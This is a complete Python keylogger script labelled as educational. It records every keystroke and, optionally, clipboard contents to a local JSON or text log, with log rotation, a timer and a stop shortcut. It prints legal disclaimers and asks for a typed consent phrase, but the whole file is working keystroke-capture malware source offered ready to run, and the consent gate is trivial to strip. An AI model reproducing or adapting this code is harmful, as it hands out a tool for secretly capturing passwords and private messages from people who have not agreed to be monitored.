#!/usr/bin/env python3
"""
Educational Keylogger - FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY.

LEGAL DISCLAIMER:
    This software is provided strictly for educational and authorized security
    testing purposes. Unauthorized interception of keystrokes is a criminal
    offense in most jurisdictions, including but not limited to violations of
    the Computer Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, and
    the EU General Data Protection Regulation (GDPR).

    You MUST have explicit, written consent from the owner of any system on
    which this software is executed. The authors accept NO liability for any
    misuse of this software.

Usage:
    python keylogger.py --output keylog.json --format json --clipboard --duration 60
"""

import argparse
import datetime
import json
import os
import signal
import sys
import threading
import time

try:
    from pynput import keyboard
except ImportError:
    sys.exit("Error: pynput is required. Install with: pip install pynput")

try:
    import pyperclip
except ImportError:
    pyperclip = None

try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
except ImportError:
    # Provide no-op fallbacks so the script runs without colorama
    class _NoColor:
        RED = YELLOW = GREEN = CYAN = MAGENTA = RESET = ""
    class _NoStyle:
        BRIGHT = RESET_ALL = ""
    Fore = _NoColor()
    Style = _NoStyle()


DISCLAIMER = """
================================================================================
  EDUCATIONAL KEYLOGGER - FOR AUTHORIZED SECURITY TESTING ONLY
================================================================================

  LEGAL DISCLAIMER:
  This tool is provided EXCLUSIVELY for educational purposes and authorized
  penetration testing. Unauthorized use of keyloggers is ILLEGAL and may
  result in severe criminal penalties.

  By proceeding, you confirm that:
    1. You have WRITTEN AUTHORIZATION from the system owner.
    2. You are using this tool solely for legitimate security research,
       education, or authorized penetration testing.
    3. You accept full legal responsibility for your use of this tool.

================================================================================
"""


def print_banner():
    """Print the educational disclaimer banner."""
    print(f"{Fore.RED}{Style.BRIGHT}{DISCLAIMER}{Style.RESET_ALL}")


def get_consent():
    """Prompt the user for explicit consent before starting."""
    print(f"{Fore.YELLOW}Do you have authorized, written consent to run this "
          f"keylogger on this system?{Style.RESET_ALL}")
    response = input(f"{Fore.YELLOW}Type 'YES I HAVE AUTHORIZATION' to proceed: {Style.RESET_ALL}")
    if response.strip() != "YES I HAVE AUTHORIZATION":
        print(f"{Fore.RED}Consent not confirmed. Exiting.{Style.RESET_ALL}")
        sys.exit(1)
    print(f"\n{Fore.GREEN}Consent confirmed. Starting keylogger...{Style.RESET_ALL}\n")


class KeyLogger:
    """
    Educational keystroke logger with optional clipboard monitoring.

    DISCLAIMER: For authorized security testing and educational use only.
    """

    STOP_COMBINATION = {keyboard.Key.ctrl_l, keyboard.Key.shift, keyboard.Key.f12}

    def __init__(self, output_path, log_format="json", enable_clipboard=False,
                 max_size_kb=1024, duration=None):
        self.output_path = output_path
        self.log_format = log_format
        self.enable_clipboard = enable_clipboard
        self.max_size_kb = max_size_kb
        self.duration = duration

        self.running = False
        self.current_keys = set()
        self.listener = None
        self.clipboard_thread = None
        self.last_clipboard = ""
        self.keystroke_count = 0
        self.start_time = None
        self.log_file = None
        self.lock = threading.Lock()
        self.rotation_count = 0

    def _rotate_log_if_needed(self):
        """Rotate the log file if it exceeds the configured max size."""
        if not os.path.exists(self.output_path):
            return
        size_kb = os.path.getsize(self.output_path) / 1024
        if size_kb >= self.max_size_kb:
            self.rotation_count += 1
            base, ext = os.path.splitext(self.output_path)
            rotated = f"{base}.{self.rotation_count}{ext}"
            os.rename(self.output_path, rotated)
            print(f"{Fore.CYAN}[Log rotated] {self.output_path} -> {rotated}{Style.RESET_ALL}")

    def _write_entry(self, entry):
        """Write a single log entry to the output file."""
        with self.lock:
            self._rotate_log_if_needed()
            with open(self.output_path, "a", encoding="utf-8") as f:
                if self.log_format == "json":
                    f.write(json.dumps(entry) + "\n")
                else:
                    ts = entry.get("timestamp", "")
                    etype = entry.get("type", "")
                    value = entry.get("value", "")
                    f.write(f"[{ts}] [{etype}] {value}\n")

    def _timestamp(self):
        return datetime.datetime.now().isoformat()

    def _on_press(self, key):
        """Handle key press events."""
        self.current_keys.add(key)

        # Check for stop combination (Ctrl+Shift+F12)
        if self.STOP_COMBINATION.issubset(self.current_keys):
            print(f"\n{Fore.YELLOW}[Stop shortcut detected: Ctrl+Shift+F12] "
                  f"Stopping keylogger...{Style.RESET_ALL}")
            self.stop()
            return False

        try:
            key_str = key.char if key.char is not None else ""
        except AttributeError:
            key_str = f"[{key.name}]"

        if key_str:
            self.keystroke_count += 1
            entry = {
                "timestamp": self._timestamp(),
                "type": "keystroke",
                "value": key_str,
                "disclaimer": "EDUCATIONAL USE ONLY"
            }
            self._write_entry(entry)

    def _on_release(self, key):
        """Handle key release events."""
        self.current_keys.discard(key)

    def _monitor_clipboard(self):
        """Monitor the clipboard for changes in a background thread."""
        if pyperclip is None:
            print(f"{Fore.YELLOW}[Warning] pyperclip not installed; "
                  f"clipboard monitoring disabled.{Style.RESET_ALL}")
            return

        while self.running:
            try:
                current = pyperclip.paste()
                if current and current != self.last_clipboard:
                    self.last_clipboard = current
                    entry = {
                        "timestamp": self._timestamp(),
                        "type": "clipboard",
                        "value": current,
                        "disclaimer": "EDUCATIONAL USE ONLY"
                    }
                    self._write_entry(entry)
            except Exception:
                pass
            time.sleep(1.0)

    def _duration_timer(self):
        """Stop the logger after the configured duration (seconds)."""
        time.sleep(self.duration)
        if self.running:
            print(f"\n{Fore.YELLOW}[Duration limit reached: {self.duration}s] "
                  f"Stopping keylogger...{Style.RESET_ALL}")
            self.stop()

    def start(self):
        """Start the keylogger."""
        self.running = True
        self.start_time = time.time()

        # Write session header
        header = {
            "timestamp": self._timestamp(),
            "type": "session_start",
            "value": "Keylogger session started",
            "disclaimer": "FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY"
        }
        self._write_entry(header)

        print(f"{Fore.GREEN}[Logging keystrokes to: {self.output_path}]{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[Format: {self.log_format}]{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[Max log size: {self.max_size_kb} KB]{Style.RESET_ALL}")
        if self.enable_clipboard:
            print(f"{Fore.GREEN}[Clipboard monitoring: ON]{Style.RESET_ALL}")
        if self.duration:
            print(f"{Fore.GREEN}[Duration limit: {self.duration}s]{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[Press Ctrl+Shift+F12 to stop]{Style.RESET_ALL}\n")

        # Start clipboard monitor thread
        if self.enable_clipboard:
            self.clipboard_thread = threading.Thread(
                target=self._monitor_clipboard, daemon=True
            )
            self.clipboard_thread.start()

        # Start duration timer thread
        if self.duration:
            timer_thread = threading.Thread(target=self._duration_timer, daemon=True)
            timer_thread.start()

        # Start keyboard listener (blocks until stopped)
        with keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release
        ) as self.listener:
            self.listener.join()

    def stop(self):
        """Stop the keylogger and write session summary."""
        if not self.running:
            return
        self.running = False

        elapsed = time.time() - self.start_time if self.start_time else 0

        footer = {
            "timestamp": self._timestamp(),
            "type": "session_end",
            "value": "Keylogger session ended",
            "total_keystrokes": self.keystroke_count,
            "duration_seconds": round(elapsed, 2),
            "disclaimer": "FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL PURPOSES ONLY"
        }
        self._write_entry(footer)

        print(f"\n{Fore.GREEN}Session summary:{Style.RESET_ALL}")
        print(f"  Total keystrokes: {self.keystroke_count}")
        print(f"  Duration: {round(elapsed, 2)}s")
        print(f"  Log file: {self.output_path}")

        if self.listener:
            self.listener.stop()


def parse_args():
    parser = argparse.ArgumentParser(
        description=(
            "Educational Keylogger - FOR AUTHORIZED SECURITY TESTING ONLY. "
            "Unauthorized use is illegal."
        ),
        epilog=(
            "DISCLAIMER: This tool is for educational and authorized security "
            "testing purposes only. You must have written consent from the "
            "system owner before use."
        ),
    )
    parser.add_argument(
        "--output", "-o",
        default="keylog.json",
        help="Output log file path (default: keylog.json)"
    )
    parser.add_argument(
        "--duration", "-d",
        type=int,
        default=None,
        help="Auto-stop after N seconds (default: unlimited)"
    )
    parser.add_argument(
        "--clipboard", "-c",
        action="store_true",
        help="Enable clipboard monitoring"
    )
    parser.add_argument(
        "--format", "-f",
        choices=["text", "json"],
        default="json",
        help="Log format: text or json (default: json)"
    )
    parser.add_argument(
        "--max-size",
        type=int,
        default=1024,
        help="Max log file size in KB before rotation (default: 1024)"
    )
    return parser.parse_args()


def main():
    """Entry point for the educational keylogger."""
    print_banner()
    args = parse_args()
    get_consent()

    logger = KeyLogger(
        output_path=args.output,
        log_format=args.format,
        enable_clipboard=args.clipboard,
        max_size_kb=args.max_size,
        duration=args.duration,
    )

    # Handle SIGINT gracefully
    def handle_sigint(sig, frame):
        print(f"\n{Fore.YELLOW}[SIGINT received] Stopping...{Style.RESET_ALL}")
        logger.stop()
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_sigint)

    try:
        logger.start()
    except KeyboardInterrupt:
        logger.stop()


if __name__ == "__main__":
    main()
